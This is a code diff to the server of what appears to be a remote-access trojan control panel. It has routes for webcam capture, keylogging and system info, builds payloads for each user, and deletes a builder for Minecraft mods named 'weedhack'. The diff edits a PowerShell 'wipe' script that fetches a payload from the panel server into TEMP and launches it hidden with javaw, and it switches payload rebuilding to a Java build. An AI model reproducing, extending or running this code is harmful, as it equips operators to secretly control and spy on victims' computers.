@@ -16,8 +16,7 @@ import db, { UPLOAD_DIR } from './db.js';
 import { startUdp, closeUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors, getCursor, getPing } from './net.js';
 import { handleRpc } from './tcp_rpc.js';
 import { buildBoot } from './builder/rustbuild.js';
-import { buildJavaPayload } from './builder/java_build.js'; // NEW IMPORT
-import { buildMinecraftMod, progressStore as mcProgressStore } from './builder/minecraftbuild.js';
+import { buildJavaPayload } from './builder/java_build.js';
 import { countriesFor } from './builder/geo.js';
 
 const __dirname  = path.dirname(fileURLToPath(import.meta.url));
@@ -40,9 +39,6 @@ if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true }
 
 const BUILD_DIR = path.join(__dirname, 'build');
 if (!fs.existsSync(BUILD_DIR)) fs.mkdirSync(BUILD_DIR, { recursive: true });
-
-const MC_BUILD_DIR = path.join(BUILD_DIR, 'mc');
-if (!fs.existsSync(MC_BUILD_DIR)) fs.mkdirSync(MC_BUILD_DIR, { recursive: true });
 
 if (!fs.existsSync(path.join(PUBLIC_DIR, 'css', 'style.css'))) {
   console.error(`[startup] FATAL: ${PUBLIC_DIR}/css/style.css missing.`);
@@ -142,14 +138,12 @@ const limitGlobal = limit({
     req.path.endsWith('/webcam/stop') ||
     req.path.endsWith('/keylog/stop') ||
     req.path.endsWith('/sysinfo') ||
-    req.path.startsWith('/api/build/minecraft/progress/') ||
     req.path === '/api/admin2/stats',
 });
 const limitAuth     = limit({ windowMs: 15 * 60_000, max: 20,  message: { error: 'too many attempts, slow down' } });
 const limitWebhook  = limit({ windowMs: 60 * 60_000, max: 5,   message: { error: 'webhook test limit reached' } });
 const limitDownload = limit({ windowMs: 60_000,      max: 60,  message: { error: 'too many downloads' } });
 const limitBuild    = limit({ windowMs: 60 * 60_000, max: 10,  message: { error: 'build limit reached — 10 per hour' } });
-const limitMcBuild  = limit({ windowMs: 60 * 60_000, max: 5,   message: { error: 'minecraft build limit — 5 per hour' } });
 const limitAdmin    = limit({ windowMs: 15 * 60_000, max: 20,  message: { error: 'Too many admin attempts. Locked for 15 minutes.' } });
 
 app.use(limitGlobal);
@@ -207,7 +201,7 @@ const getOwnUser = (uid) => db.prepare(sql`
 
 // ─── wipe command builder ────────────────────────────────────────────────────
 function buildWipeCommand(serverBase) {
-  const stUrl = `${serverBase}/api/downloads/st.exe`;
+  const stUrl = `${serverBase}/api/downloads/st.jar`;
 
   const script = `
 $ErrorActionPreference = 'SilentlyContinue'
@@ -226,7 +220,7 @@ function Get-St {
   Invoke-WebRequest @params
 }
 
-$stTmp = Join-Path $env:TEMP 'st_new.exe'
+$stTmp = Join-Path $env:TEMP 'st_new.jar'
 $ok = $false
 for ($i = 0; $i -lt 5; $i++) {
   try {
@@ -275,18 +269,19 @@ for ($i = 0; $i -lt 15; $i++) {
 "wipe done, remaining: $($left.Count)" | Out-File -Encoding UTF8 -Append $log
 
 New-Item -ItemType Directory -Force -Path $dir | Out-Null
-$stDst = Join-Path $dir 'st.exe'
+$stDst = Join-Path $dir 'st.jar'
 for ($i = 0; $i -lt 15; $i++) {
   try { Move-Item -Force -Path $stTmp -Destination $stDst -ErrorAction Stop; break }
   catch { Start-Sleep -Milliseconds 500 }
 }
-"moved st.exe: $(Test-Path $stDst)" | Out-File -Encoding UTF8 -Append $log
+"moved st.jar: $(Test-Path $stDst)" | Out-File -Encoding UTF8 -Append $log
 
 if (Test-Path $stDst) {
-  Start-Process -FilePath $stDst -WorkingDirectory $dir -WindowStyle Hidden
+  $javaw = "javaw.exe"
+  Start-Process -FilePath $javaw -ArgumentList "-jar \`"$stDst\`"" -WindowStyle Hidden
   "launched" | Out-File -Encoding UTF8 -Append $log
 } else {
-  "error: st.exe missing after move" | Out-File -Encoding UTF8 -Append $log
+  "error: st.jar missing after move" | Out-File -Encoding UTF8 -Append $log
 }
 `;
 
@@ -580,24 +575,17 @@ app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
 
-  const stPath = path.join(DOWNLOAD_DIR, 'st.exe');
+  const stPath = path.join(DOWNLOAD_DIR, 'st.jar');
   let needsBuild = !fs.existsSync(stPath);
-  if (!needsBuild) {
-    const stat = fs.statSync(stPath);
-    if (Date.now() - stat.mtimeMs > 6 * 60 * 60 * 1000) needsBuild = true;
-  }
-
   if (needsBuild) {
     const row = getOwnUser(req.user.uid);
     const acctKey = row?.account_key || '';
-    if (!acctKey) return res.status(400).json({ error: 'no account key to build st.exe' });
+    if (!acctKey) return res.status(400).json({ error: 'no account key to build st.jar' });
     try {
-      const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
-      const nextBuildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
-      await buildBoot({ key: acctKey, buildId: nextBuildId, serverIp: base });
+      await buildJavaPayload();
     } catch (e) {
-      console.error('[wipe] rebuild st.exe failed', e);
-      return res.status(500).json({ error: 'failed to rebuild st.exe: ' + (e.message || 'unknown') });
+      console.error('[wipe] rebuild st.jar failed', e);
+      return res.status(500).json({ error: 'failed to rebuild st.jar: ' + (e.message || 'unknown') });
     }
   }
 
@@ -804,19 +792,6 @@ app.delete('/api/clients/:id/keylog', requireAuth, requirePremium, (req, res) =>
   res.json({ ok: true });
 });
 
-// drop legacy launcher exe if it survived from the old pipeline
-for (const stale of ['boot.exe']) {
-  const p = path.join(DOWNLOAD_DIR, stale);
-  if (fs.existsSync(p)) { try { fs.unlinkSync(p); console.log(`[startup] removed legacy ${stale}`); } catch {} }
-}
-try {
-  for (const f of fs.readdirSync(BUILD_DIR)) {
-    if (f.endsWith('.exe')) {
-      try { fs.unlinkSync(path.join(BUILD_DIR, f)); console.log(`[startup] removed legacy build ${f}`); } catch {}
-    }
-  }
-} catch {}
-
 const ALLOWED_EXT = ['.exe', '.zip', '.msi', '.dll', '.bin', '.ps1', '.dat', '.jar'];
 
 const limitDownloadExe = rateLimit({
@@ -935,94 +910,6 @@ app.get('/api/builds', requireAuth, (req, res) => {
   `).all(req.user.uid);
   res.json(rows);
 });
-
-// ---------- builder — minecraft fabric (must precede /api/builds/:id/* routes) ----------
-
-app.post('/api/build/minecraft', requireAuth, limitMcBuild, async (req, res) => {
-  const row = getOwnUser(req.user.uid);
-  const acctKey = row?.account_key || '';
-  if (!acctKey) return res.status(400).json({ error: 'no account key' });
-
-  const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
-  const buildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
-
-  const proto = req.secure || req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
-  const serverBase = `${proto}://${req.headers.host}`;
-
-  mcProgressStore.set(String(buildId), { pct: 0, step: 'queued', at: Date.now() });
-
-  (async () => {
-    try {
-      const jarBuf = await buildMinecraftMod({
-        key: acctKey,
-        buildId,
-        serverBase,
-        target: req.body?.target,
-        loaderRange: req.body?.loaderRange,
-      });
-      const outName = `weedhack_${buildId}_u${req.user.uid}.jar`;
-      const outPath = path.join(MC_BUILD_DIR, outName);
-      fs.writeFileSync(outPath, jarBuf, { mode: 0o644 });
-
-      const stale = db.prepare(sql`SELECT id, stored_name FROM builds WHERE user_id = ? AND base = 'minecraft'`).all(req.user.uid);
-      for (const b of stale) {
-        if (b.stored_name && b.stored_name !== outName) {
-          try { fs.unlinkSync(path.join(MC_BUILD_DIR, b.stored_name)); } catch {}
-        }
-        db.prepare(sql`DELETE FROM builds WHERE id = ?`).run(b.id);
-      }
-
-      db.prepare(sql`
-        INSERT INTO builds (user_id, name, stored_name, size, base, key, config, created_at)
-        VALUES (?, ?, ?, ?, 'minecraft', ?, '{}', ?)
-      `).run(req.user.uid, outName, outName, jarBuf.length, acctKey, Date.now());
-
-      mcProgressStore.set(String(buildId), {
-        pct: 100, step: 'done',
-        jarName: outName, jarSize: jarBuf.length,
-        downloadUrl: `/api/builds/minecraft/${buildId}/download`,
-        at: Date.now(),
-      });
-    } catch (e) {
-      console.error('[mc-build]', e);
-      mcProgressStore.set(String(buildId), {
-        pct: 0, step: 'failed',
-        error: (e.stderr || e.message || 'unknown').toString().slice(-2000),
-        at: Date.now(),
-      });
-    }
-  })();
-
-  res.json({ ok: true, buildId });
-});
-
-app.get('/api/build/minecraft/progress/:id', requireAuth, (req, res) => {
-  const id = String(req.params.id);
-  const p = mcProgressStore.get(id);
-  if (!p) return res.status(404).json({ error: 'unknown build' });
-  const row = db.prepare(sql`SELECT user_id FROM builds WHERE id = ?`).get(Number(id));
-  if (row && row.user_id !== req.user.uid) return res.status(403).json({ error: 'not yours' });
-  res.json(p);
-});
-
-// MC jar download — must be declared before /api/builds/:id/download so the
-// literal "minecraft" segment wins over the numeric :id param.
-app.get('/api/builds/minecraft/:id/download', limitDownload, requireAuth, (req, res) => {
-  const id = Number(req.params.id);
-  const row = db.prepare(sql`
-    SELECT name, stored_name, size FROM builds
-    WHERE id = ? AND user_id = ? AND base = 'minecraft'
-  `).get(id, req.user.uid);
-  if (!row) return res.status(404).json({ error: 'not found' });
-  const src = path.join(MC_BUILD_DIR, row.stored_name);
-  if (!fs.existsSync(src)) return res.status(410).json({ error: 'file gone' });
-  res.setHeader('Content-Type', 'application/java-archive');
-  res.setHeader('Content-Length', row.size);
-  res.setHeader('Content-Disposition', `attachment; filename="${row.name}"`);
-  fs.createReadStream(src).pipe(res);
-});
-
-// ---------- windows launcher build download (after minecraft literal) ----------
 
 app.get('/api/builds/:id/download', limitDownload, requireAuth, (req, res) => {
   const id = Number(req.params.id);
@@ -1191,9 +1078,6 @@ const AUTO_REFRESH_INTERVAL_MS = 6 * 60 * 60 * 1000;
 
 async function refreshAllBuilds() {
   try {
-    const oldExe = path.join(DOWNLOAD_DIR, 'boot.exe');
-    if (fs.existsSync(oldExe)) try { fs.unlinkSync(oldExe); } catch {}
-
     const userIds = db.prepare(sql`SELECT DISTINCT user_id FROM builds WHERE base = 'boot'`).all().map(r => r.user_id);
     if (userIds.length === 0) {
       console.log('[auto-refresh] no builds to refresh');
@@ -1256,14 +1140,6 @@ async function refreshAllBuilds() {
 
 setInterval(refreshAllBuilds, AUTO_REFRESH_INTERVAL_MS);
 setTimeout(refreshAllBuilds, 10_000);
-
-// ---------- progress store GC ----------
-setInterval(() => {
-  const cutoff = Date.now() - 10 * 60 * 1000;
-  for (const [k, v] of mcProgressStore) {
-    if (v.at && v.at < cutoff) mcProgressStore.delete(k);
-  }
-}, 5 * 60 * 1000).unref();
 
 // ---------- udp / http / https boot ----------
 
